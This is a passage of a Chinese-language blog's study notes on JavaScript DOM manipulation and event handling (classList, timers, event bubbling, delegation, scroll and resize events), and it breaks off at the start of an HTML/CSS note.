<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// active 是一个css类名</span></span><br><span class="line">元素.<span class="property">className</span> =<span class="string">&#x27;active&#x27;</span></span><br></pre></td></tr></table></figure>
<p>注意:</p>
<ul>
<li>由于class是关键字，所以使用className去代替</li>
<li>className是使用新值换旧值,如果需要添加一个类,需要保留之前的类名,新旧类名以空格分开</li>
</ul>
<h4 id="classList修改样式"><a href="#classList修改样式" class="headerlink" title="@classList修改样式"></a>@classList修改样式</h4><p>为了解决className 容易覆盖以前的类名，我们可以通过classList方式追加和删除类名<br>语法:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 追加一个类</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br><span class="line"><span class="comment">// 删除一个类</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br><span class="line"><span class="comment">// 切换一个类,有括号中类名则删，无则添加</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>轮播图：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> random = <span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() *sliderData.<span class="property">length</span>)</span><br><span class="line"><span class="keyword">const</span> img = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.slider-wrapper img&#x27;</span>)</span><br><span class="line">img.<span class="property">src</span> = sliderData[random].<span class="property">url</span></span><br><span class="line"><span class="keyword">const</span> title = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.slider-footer p&#x27;</span>)</span><br><span class="line">title.<span class="property">innerHTML</span> = sliderData[random].<span class="property">title</span></span><br><span class="line"><span class="keyword">const</span> footer = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.slider-footer&#x27;</span>)</span><br><span class="line">footer.<span class="property">style</span>.<span class="property">backgroundColor</span> = sliderData[random].<span class="property">color</span></span><br><span class="line"><span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">`.slider-indicator li:nth-child(<span class="subst">$&#123;random+<span class="number">1</span>&#125;</span>)`</span>)</span><br><span class="line">li.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h3><ul>
<li>表单很多情况，也需要修改属性，比如点击眼睛，可以看到密码，本质是把表单类型转换为文本框</li>
<li>正常的有属性有取值的 跟其他的标签属性没有任何区别<ul>
<li>获取:DOM对象.属性名</li>
<li>设置:DOM对象.属性名&#x3D;新值<br>获取表单中的值用<code>表单.value =&#39;用户名&#39;</code> 不能用<code>innerHTML</code><br>获取表单的类型<code>表单.type =&#39;password</code></li>
</ul>
</li>
</ul>
<p>表单有些属性中添加就有效果,移除就没有效果,一律使用布尔值表示 如果为true 代表添加了该属性 如果是false 代表移除了该属性<br>比如:disabled、checked、selected<br><code>check.checked = true</code></p>
<h3 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h3><p>标准属性:标签天生自带的属性 比如class idtitle等,可以直接使用点语法操作比如:disabled、checked、selected<br>自定义属性:</p>
<ul>
<li>在html5中推出来了专门的data-自定义属性</li>
<li>在标签上一律以data-开头</li>
<li>在DOM对象上一律以dataset对象方式获取，set意为集合，dataset即获取所有自定义属性<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;10&quot;</span>&gt;</span>盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">dataset</span>.<span class="property">id</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="定时器与间歇函数"><a href="#定时器与间歇函数" class="headerlink" title="定时器与间歇函数"></a>定时器与间歇函数</h3><p>功能:重复执行代码</p>
<ol>
<li>开启定时器<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(函数，间隔时间)</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//匿名函数体</span></span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">setInterval</span>(fn,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>每隔一段时间调用这个函数</li>
<li>间隔时间单位是毫秒、</li>
<li>返回值是一个id(数字型)</li>
</ul>
</li>
<li>关闭定时器<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> 变量名 = <span class="built_in">setInterval</span>(函数，间隔时间)</span><br><span class="line"><span class="built_in">clearInterval</span>(变量名)</span><br><span class="line"><span class="comment">//重新打开</span></span><br><span class="line">变量名 = <span class="built_in">setInterval</span>(函数，间隔时间)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>示例–实现倒计时强制用户阅读用户协议</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">disabled</span>&gt;</span>我已经阅读用户协议(5)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> i = <span class="number">5</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> n = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">                i--</span></span><br><span class="line"><span class="language-javascript">                button.<span class="property">innerHTML</span>=<span class="string">`我已经阅读用户协议(<span class="subst">$&#123;i&#125;</span>)&quot;`</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (i == <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">                &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="built_in">clearInterval</span>(n)</span></span><br><span class="line"><span class="language-javascript">                    button.<span class="property">disabled</span> =<span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">                    button.<span class="property">innerHTML</span>=<span class="string">&quot;同意&quot;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>事件：事件是在编程时系统内发生的动作或者发生的事情，如点击，鼠标经过等<br>事件监听：让程序检测是否有事件产生，一旦有事件触发，就立即调用一个函数做出响应，也称为绑定事件或者注册事件<br>比如鼠标经过，显示下拉菜单，比如点击可以播放轮播图等等</p>
<p>语法：<code>元素对象.addEventListener(&#39;事件类型&#39;,要执行的函数)</code></p>
<p>事件监听三要素:</p>
<ul>
<li>事件源:那个dom元素被事件触发了，要获取dom元素</li>
<li>事件类型:用什么方式触发，比如鼠标单击 click、鼠标经过 mouseover等</li>
<li>事件调用的函数:要做什么事</li>
</ul>
<h3 id="事件监听版本和各类事件"><a href="#事件监听版本和各类事件" class="headerlink" title="事件监听版本和各类事件"></a>事件监听版本和各类事件</h3><p>DOM L0<br>事件源.on事件 &#x3D;function(){}<br>DOM L2<br>事件源.addEventListener(事件，事件处理函数)<br>区别:on方式会被覆盖，addEventListener方式可绑定多次，拥有事件更多特性，推荐使用<br>参考：<a href="https://blog.csdn.net/qq_44114279/article/details/106739602">EventListener和on的区别</a></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/fe6329d5a02171a0fecaa79c81bdb9ae.png"></p>
<table>
<thead>
<tr>
<th>事件类型</th>
<th>触发条件</th>
<th>名称</th>
</tr>
</thead>
<tbody><tr>
<td>鼠标事件</td>
<td>鼠标</td>
<td>click:鼠标点击<br>mouseenter:鼠标经过<br>mouseleave:鼠标离开</td>
</tr>
<tr>
<td>焦点事件</td>
<td>表单获得光标</td>
<td>focus:获得焦点<br>blur:失去焦点</td>
</tr>
<tr>
<td>键盘事件</td>
<td>键盘</td>
<td>keydown:键盘按下<br>keyup:键盘抬起</td>
</tr>
<tr>
<td>文本事件</td>
<td>表单输入</td>
<td>input:用户输入</td>
</tr>
</tbody></table>
<h3 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h3><ul>
<li>概念<blockquote>
<p>一个对象，这个对象里有事件触发时的相关信息</p>
<ul>
<li>例如:鼠标点击事件中，事件对象就存了鼠标点在哪个位置等相关信息</li>
</ul>
</blockquote>
</li>
<li>使用场景<blockquote>
<p>可以判断用户按下哪个键，比如按下回车键可以发布新闻<br>可以判断鼠标点击了哪个元素，从而做相应的操</p>
</blockquote>
</li>
<li>语法:如何获取<blockquote>
<p><strong>在事件绑定的回调函数的第一个参数就是事件对象</strong><br>一般命名为event、ev、e</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt;元素.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;&#125;)</span><br></pre></td></tr></table></figure></blockquote>
</li>
</ul>
<p>部分常用属性</p>
<ul>
<li>type 获取当前的事件类型</li>
<li>clientX&#x2F;clientY 获取光标相对于浏览器可见窗口左上角的位置</li>
<li>offsetX&#x2F;offsetY 获取光标相对于当前DOM元素左上角的位置</li>
<li>key(旧称keycode) 用户按下的键盘键的值</li>
</ul>
<p>**使用示例:**仅当按下回车键触发键盘事件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input)</span></span><br><span class="line"><span class="string">input.addEventListener(&#x27;</span>keyup<span class="string">&#x27;,function(e)&#123;</span></span><br><span class="line"><span class="string">   if(e.key == &#x27;</span><span class="title class_">Enter</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">   &#123;</span></span><br><span class="line"><span class="string">      console.log(&#x27;</span>按下回车键<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre></td></tr></table></figure>

<h3 id="环境对象"><a href="#环境对象" class="headerlink" title="环境对象"></a>环境对象</h3><p><em>环境对象</em>:指的是函数内部特殊的变量 this，它代表着当前函数运行时所处的环境。弄清楚this的指向，可以让我们代码更简洁</p>
<ul>
<li>函数的调用方式不同，this 指代的对象也不同</li>
<li>[谁调用， this就是谁]是判断this指向的粗略规则</li>
<li>直接调用函数，其实相当于是window.函数,即windows调用了函数,所以this指代window 例如调用函数test(),其实相当于window.test(),所以this指向windows。</li>
<li>而在事件监听中，事件调用的函数的this即指向调用的元素，如：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//btn调用函数function，故而this指向btn</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>如果将函数 A 做为参数传递给函数 B时，我们称函数 A为回调函数<br>简单理解: 当一个函数当做参数来传递给另外一个函数的时候，这个函数就是回调函数</p>
<p>常见的使用场景:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是回调函数...&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// fn传递给了setInterval，fn就是回调函数</span></span><br><span class="line"><span class="built_in">setInterval</span>(fn，<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>

<h3 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h3><p>事件流指的是事件完整执行过程中的流动路径</p>
<ul>
<li>说明:假设页面里有个div，当触发事件时，会经历两个阶段，分别是捕获阶段、冒泡阶段<ul>
<li>捕获阶段是 父–&gt;子 </li>
<li>冒泡阶段是 子–&gt;父</li>
</ul>
</li>
<li>实际工作都是使用事件冒泡为主</li>
</ul>
<p>事件捕获：<br>L2的事件监听下才用，采用on的L0没有<br>(document-&gt;Element html-&gt;Element body -&gt; Element div)</p>
<p>事件冒泡概念:</p>
<ul>
<li>当一个元素的事件被触发时，同样的事件将会在该元素的所有祖先元素中依次被触发。这一过程被称为<em>事件冒泡</em></li>
<li>简单理解:当一个元素触发事件后，会依次向上调用所有父级元素的同名事件</li>
<li>事件冒泡是默认存在的</li>
<li>L2事件监听第三个参数是 false，或者默认都是冒泡</li>
</ul>
<p>举例：假设以下代码中son标签包裹在fa标签中,fa标签包裹在body中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;grandpa&#x27;</span>)</span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br><span class="line"><span class="comment">//true表示启用事件捕获，false表示冒泡触发，默认为false</span></span><br><span class="line">fa.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;fa&#x27;</span>)</span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br><span class="line">son.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;son&#x27;</span>)</span><br><span class="line">&#125;,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li>在这种情况下，点击son标签会导致三个事件均被触发，且先触发document，然后是fa,最后是son</li>
<li>假如是false(默认),也就是冒泡模式下，则反过来，三个事件均被触发，先是son，然后fa，最后document</li>
<li>必须是<em>同名事件</em>即如果是’click’,都是click才能冒泡触发</li>
</ol>
<p>阻止冒泡（也阻止捕获）：<br>问题:因为默认就有冒泡模式的存在，所以容易导致事件影响到父级元素<br>需求:若想把事件就限制在当前元素内，就需要阻止事件冒泡<br>前提:阻止事件冒泡需要拿到事件对象<br>语法:<code>事件对象.stopPropagation()</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">son.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;son&#x27;</span>)</span><br><span class="line">   e.<span class="title function_">stopPropagation</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="事件解绑"><a href="#事件解绑" class="headerlink" title="事件解绑"></a>事件解绑</h3><p>应用场景</p>
<p>匿名函数无法解绑<br><strong>addEventListener方式</strong>，必须使用:<br>removeEventListener(事件类型,事件处理函数，[获取捕获或者冒泡阶段1])<br>例如:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;点击了&#x27;</span>)&#125;)</span><br><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, fn)</span><br><span class="line"><span class="comment">// 解绑事件</span></span><br><span class="line">btn.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>,fn)</span><br></pre></td></tr></table></figure>

<p><strong>on事件方式</strong>，直接使用null覆盖就可以实现事件的解绑<br>语法:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line">btn.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;点击了&#x27;</span>)</span><br><span class="line"><span class="comment">// 解绑事件</span></span><br><span class="line">btn.<span class="property">onclick</span> = <span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<p>两种注册事件的区别</p>
<ul>
<li>传统on注册(L0)<br> 同一个对象,后面注册的事件会覆盖前面注册(同一个事件)<br> 直接使用null覆盖偶就可以实现事件的解绑<br> 都是冒泡阶段执行的</li>
<li>事件监听注册(L2)<br> 语法:addEventListener(事件类型,事件处理函数,是否使用捕获)<br> 后面注册的事件不会覆盖前面注册的事件(同一个事件)<br> 可以通过第三个参数去确定是在冒泡或者捕获阶段执行<br> 必须使用removeEventListener(事件类型,事件处理函数,获取捕获或者冒泡阶段)<br> 匿名函数无法被解绑</li>
</ul>
<h3 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h3><p>事件委托是利用事件流的特征解决一些开发需求的知识技巧</p>
<ul>
<li>优点:减少注册次数，可以提高程序性能</li>
<li>原理:事件委托其实是利用事件冒泡的特点给父元素注册事件，当我们触发子元素的时候，会冒泡到父元素身上，从而触发父元素的事件</li>
<li>实现:事件对象.target.tagName 可以获得真正触发事件的元素</li>
</ul>
<p>示例：假如ul标签下有多个li标签,点击某个li，该li变为红色</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(e.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;LI&#x27;</span>)</span><br><span class="line">   e.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//可以借控制台输出查看e.target的结构</span></span><br><span class="line"><span class="comment">//console.log(e.target)</span></span><br></pre></td></tr></table></figure>

<h3 id="阻止默认行为"><a href="#阻止默认行为" class="headerlink" title="阻止默认行为"></a>阻止默认行为</h3><p>我们某些情况下需要阻止默认行为的发生，比如 阻止 链接的跳转，表单域跳转<br>语法:<code>e.preventDefault()</code></p>
<h3 id="页面加载事件"><a href="#页面加载事件" class="headerlink" title="页面加载事件"></a>页面加载事件</h3><p>加载外部资源(如图片、外联CSS和JavaScript等)加载完毕时触发的事件</p>
<blockquote>
<p>有些时候需要等页面资源全部处理完了做一些事情<br>老代码喜欢把 script 写在 head 中，这时候直接找 dom 元素找不到<br>事件名:load<br>监听页面所有资源加载完毕:<br>给 window 添加 load 事件</p>
</blockquote>
<p>页面所有元素加载完才回去执行函数</p>
<p>当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，而无需等待样式表、图像等完<br>全加载<br>事件名:DOMContentLoaded<br>监听页面DOM加载完毕:</p>
<blockquote>
<p>给document添加DOMContentLoaded 事件</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DoMcontentLoaded&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="comment">/*执行的操作*/</span>&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="页面滚动事件"><a href="#页面滚动事件" class="headerlink" title="页面滚动事件"></a>页面滚动事件</h3><p>给window或 document 添加 scroll 事件<br>监听某个元素的内部滚动直接给某个元素加即可</p>
<p>滚动条在滚动的时候持续触发的事件</p>
<blockquote>
<p>很多网页需要检测用户把页面滚动到某个区域后做一些处理，比如固定导航栏，比如返回顶部<br>事件名:scroll<br>监听整个页面滚动:</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面滚动事件</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">// 执行的操作</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>使用场景</p>
<blockquote>
<p>我们想要页面滚动一段距离，比如100px，就让某些元素<br>显示隐藏，那我们怎么知道，页面滚动了100像素呢?<br>就可以使用scroll 来检测滚动的距离</p>
</blockquote>
<p>scrollLeft和scrollTop(属性)</p>
<ul>
<li>获取被卷去的大小</li>
<li>获取元素内容往左、往上滚出去看不到的距离</li>
<li>这两个值是可读写的</li>
</ul>
<p>1.被卷去的头部或者左侧用那个属性?是否可以读取和修改?</p>
<ul>
<li>scrollTop &#x2F;scrollLeft</li>
<li>可以读取，也可以修改(赋值)<br>2.检测页面滚动的头部距离(被卷去的头部)用那个属性?</li>
<li>document.documentElement.scrollTop</li>
</ul>
<h3 id="页面尺寸事件和元素宽高获取"><a href="#页面尺寸事件和元素宽高获取" class="headerlink" title="页面尺寸事件和元素宽高获取"></a>页面尺寸事件和元素宽高获取</h3><ul>
<li>会在窗口尺寸改变的时候触发事件:<ul>
<li>resize <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="comment">/*执行的代码*/</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>检测屏幕宽度:<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">let</span> w= <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(w)&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><em>元素尺寸于位置-尺寸</em><br>获取宽高:<br>获取元素的自身宽高、包含元素自身设置的宽高、padding、border<br>offsetWidth和offsetHeight<br>获取出来的是数值,方便计算<br>注意:获取的是可视宽高，如果盒子是隐藏的,获取的结果是0<br>获取位置:<br>获取元素距离自己定位父级元素的左、上距离<br>offsetLeft和offsetTop 注意是只读属性<br>offset求的是相对整个页面而不是视窗的</p>
<p>获取宽高:<br>获取元素的可见部分宽高(不包含边框，margin，滚动条等)<br>产</p>
<blockquote>
<p>clientwidth和clientHeight</p>
</blockquote>
<p>获取位置:<br>2.element.getBoundingClientRect()<br>方法返回元素的大小及其相对于视口的位置</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>scrollLeft和scrollTop</td>
<td>被卷去的头部和左侧</td>
<td>配合页面滚动来用，可读写</td>
</tr>
<tr>
<td>clientwidth 和clientHeight</td>
<td>获得元素宽度和高度</td>
<td>不包含border,margin，滚动条 用于js,获取元素大小，只读属性</td>
</tr>
<tr>
<td>offsetwidth和offsetHeight</td>
<td>获得元素宽度和高度</td>
<td>包含border、padding，滚动条等，只</td>
</tr>
<tr>
<td>读</td>
<td></td>
<td></td>
</tr>
<tr>
<td>offsetLeft和offsetTop</td>
<td>获取元素距离自己定位父级元素的左、上距离</td>
<td>获取元素位置的时候使用，只读属性</td>
</tr>
</tbody></table>
<h3 id="事件监听示例"><a href="#事件监听示例" class="headerlink" title="事件监听示例"></a>事件监听示例</h3><p><a href="https://github.com/Fushiye/Study/blob/python/hcjv/%E9%BC%A0%E6%A0%87%E4%BA%8B%E4%BB%B6-%E8%BD%AE%E6%92%AD%E5%9B%BE.html">鼠标事件-轮播图</a><br>[键盘事件-评论区]</p>
<p>tab栏切换</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>文本域长度：元素.value.length<br>去除字符串前后空格：字符串.trim()</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1>]]></content>
      <categories>
        <category>前端技术</category>
        <category>语言</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>L-HTML-CSS-Note</title>
    <url>/2024/05/11/L-HTML-CSS-Note/</url>
    <content><![CDATA[<p>HTML 和 CSS 语法及其示例</p>
<span id="more"></span>

<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p><a href="https://www.bilibili.com/video/BV1kM4y127Li/?spm_id_from=333.976.0.0">视频教学</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.runoob.com/html/html-tutorial.html">菜鸟教程-HTML</a><br><a href="https://www.runoob.com/css/css-tutorial.html">菜鸟教程-CSS</a></p>
<h2 id="chome调试工具的使用"><a href="#chome调试工具的使用" class="headerlink" title="chome调试工具的使用"></a>chome调试工具的使用</h2><p>右键 检查<br>调试后要更改源码才能保存<br>若出现删除线，可能是以下情况：<br>1、被注释<br>2、被覆盖<br>3、自己将前面的勾取消了<br>若出现三角形，表明语法存在问题，将鼠标停留在出错位置会显示具体原因<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515174431.png"></p>
<h2 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h2><p><strong>web标准构成</strong></p>
<table>
<thead>
<tr>
<th>构成</th>
<th>语言</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>结构</td>
<td>HTML</td>
<td>页面元素的内容</td>
</tr>
<tr>
<td>表现</td>
<td>CSS</td>
<td>网页元素的外观和位置等页面样式，如颜色大小</td>
</tr>
<tr>
<td>行为</td>
<td>JavaScript</td>
<td>网页模型的定义和页面交互</td>
</tr>
</tbody></table>
<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        网页主体</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><p>&lt;!—内为注释内容 –&gt;<br>或者使用快捷键：<br>ctrl+k+c,取消ctrl+k+u</p>
<h3 id="标签结构："><a href="#标签结构：" class="headerlink" title="标签结构："></a>标签结构：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单标签：&lt;br&gt;</span><br><span class="line">双标签：&lt;strong class = &quot;one&quot; &gt; 粗体 &lt;/strong&gt;   </span><br><span class="line">       开始标签 属性名   属性值  内容 结束标签</span><br></pre></td></tr></table></figure>
<p>&lt;&gt;内为标签名，标签可以存在多个属性，均需要写在开始标签内部，之间以空格分开，没有顺序要求</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="文字排版标签-h-p-hr-br"><a href="#文字排版标签-h-p-hr-br" class="headerlink" title="文字排版标签(h,p,hr,br)"></a>文字排版标签(h,p,hr,br)</h3><p><strong>标题标签</strong><br>代码：</p>
